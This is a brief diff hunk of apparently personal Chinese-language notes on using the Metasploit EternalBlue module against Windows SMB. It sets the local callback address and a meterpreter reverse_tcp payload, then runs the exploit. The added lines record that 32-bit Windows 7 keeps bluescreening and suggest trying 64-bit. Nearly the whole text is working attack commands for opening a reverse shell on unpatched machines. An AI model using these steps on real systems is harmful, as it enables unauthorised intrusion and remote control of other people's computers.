@@ -11,3 +11,5 @@ use exploit/windows/smb/ms17_010_eternalblue
  set LHOST 192.168.5.118    本机
 //set payload windows/x64/meterpreter/reverse_tcp     //配置回链方式
 run 或者 exploit
+
+win7 32位失败  老是 蓝屏 换64位试试
